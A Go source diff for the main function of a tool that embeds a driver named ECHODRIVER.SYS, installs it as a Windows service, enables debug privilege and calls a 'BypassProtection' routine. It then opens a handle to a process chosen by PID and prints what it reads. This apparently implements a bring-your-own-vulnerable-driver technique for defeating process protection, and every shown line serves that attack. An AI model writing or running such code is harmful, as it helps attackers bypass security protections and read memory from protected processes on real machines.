@@ -4,28 +4,38 @@ import (
 	"echodriver/driver"
 	"echodriver/services"
 	"echodriver/utils"
+	_ "embed"
 	"errors"
+	"flag"
 	"fmt"
 
 	"golang.org/x/sys/windows"
 )
 
+var PID = flag.Int("pid", 0, "PID of the process to be analyzed")
+
+//go:embed ECHODRIVER.SYS
+var DRIVER_BYTES []byte
+
 func main() {
+
+	flag.Parse()
+	defer driver.Clean()
+	if *PID == 0 {
+		utils.ParseError(errors.New("please enter a valid pid"))
+		return
+	}
 
 	if err := utils.EnableSeDebugPrivilege(); err != nil {
 		utils.ParseError(err)
 		return
 	}
 
-	srv, err := services.CreateService("EchoDrv", driver.DRIVER_FULL_PATH)
+	driver.WriteDriver(DRIVER_BYTES)
 
-	if err != nil {
+	if err := services.SetUpService("EchoDrv", driver.DRIVER_FULL_PATH); err != nil {
 		utils.ParseError(err)
 		return
-	}
-
-	if !services.IsValidServiceConfig(srv) {
-		utils.ParseError(errors.New("invalid service config"))
 	}
 
 	hDriver, err := driver.GetDriverHandle()
@@ -35,9 +45,13 @@ func main() {
 		return
 	}
 
+	if err := driver.BypassProtection(*hDriver); err != nil {
+		utils.ParseError(err)
+		return
+	}
 	defer windows.CloseHandle(*hDriver)
 
-	handle, err := driver.GetProcHandle(*hDriver, 880)
+	handle, err := driver.GetProcHandle(*hDriver, *PID)
 
 	if err != nil {
 		utils.ParseError(err)
@@ -52,7 +66,5 @@ func main() {
 	}
 
 	fmt.Println(content)
-
-	services.RemoveService("EchoDrv")
 
 }
